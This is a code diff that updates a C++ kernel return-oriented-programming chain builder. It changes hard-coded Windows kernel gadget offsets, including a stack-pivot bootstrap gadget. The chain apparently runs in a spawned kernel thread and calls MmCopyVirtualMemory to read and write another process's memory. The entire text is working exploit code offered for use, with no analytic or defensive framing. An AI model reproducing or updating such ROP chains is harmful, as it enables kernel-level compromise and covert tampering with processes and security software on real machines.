@@ -41,26 +41,25 @@ void RopThreadManager::BuildMainStack(StackManager* Stack, const SharedMemoryDat
     Stack->ReadIntoRcx(reinterpret_cast<std::uint64_t>(KernelMemory->KernelSharedMemoryAllocation) + offsetof(SharedMemoryData, WriteSrcEProcess));
     // fourth arg (shared memory + offsetof(dest addr))
     Stack->SetRdx(reinterpret_cast<std::uint64_t>(KernelMemory->KernelSharedMemoryAllocation) + offsetof(SharedMemoryData, WriteDstAddress));
-    Stack->AddGadget(0x21307f, "mov rax, rdx; ret;");
+    Stack->AddGadget(0x2087ab, "mov rax, rdx; ret;");
     Stack->ReadRaxIntoRax();
     Stack->MovRaxIntoR9();
     // third arg
     Stack->SetRdx(reinterpret_cast<std::uint64_t>(KernelMemory->KernelSharedMemoryAllocation) + offsetof(SharedMemoryData, WriteDstEProcess));
-    Stack->AddGadget(0x21307f, "mov rax, rdx; ret;");
+    Stack->AddGadget(0x2087ab, "mov rax, rdx; ret;");
     Stack->ReadRaxIntoRax();
     Stack->MovRaxIntoR8();
     // second arg
     Stack->SetRdx(reinterpret_cast<std::uint64_t>(KernelMemory->KernelSharedMemoryAllocation) + offsetof(SharedMemoryData, WriteSrcAddress));
-    Stack->AddGadget(0x21307f, "mov rax, rdx; ret;");
+    Stack->AddGadget(0x2087ab, "mov rax, rdx; ret;");
     Stack->ReadRaxIntoRax();
-    Stack->AddGadget(0x3e8baf, "cmp esi, esi; ret;");
-    Stack->AddGadget(0x2cbad3, "mov rdx, rax; jne 0x......; add rsp, 0x28; ret;");
-    Stack->AddPadding(0x28);
+    Stack->MovRaxIntoRdx();
+
     // perform call
     Stack->AlignStack();
     Stack->AddGadget(Driver::GetKernelFunctionOffset("MmCopyVirtualMemory"), "MmCopyVirtualMemory address");
     // clean up shadow space + args after call
-    Stack->AddGadget(0x20268c, "add rsp, 0x38; ret;");
+    Stack->AddGadget(0x20057e, "add rsp, 0x38; ret;");
     // shadow space
     Stack->AddPadding(0x20);
     // stack args
@@ -98,7 +97,7 @@ void RopThreadManager::SendPacket()
 void RopThreadManager::SpawnThread()
 {
     // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
-    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x6999c0);
+    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x69cd70);
 
     HANDLE KernelThreadHandle;
     NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, HANDLE*, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
